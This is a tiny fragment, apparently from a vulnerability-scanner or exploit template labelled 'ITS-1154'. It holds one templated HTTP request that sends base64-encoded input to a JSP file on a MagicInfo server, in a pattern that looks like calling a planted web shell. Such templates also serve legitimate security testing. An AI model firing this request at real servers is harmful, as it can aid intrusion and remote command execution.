# Vulnerable: ITS-1154
GET /MagicInfo/{{filename}}.jsp?input={{urlencode(base64(input))}}
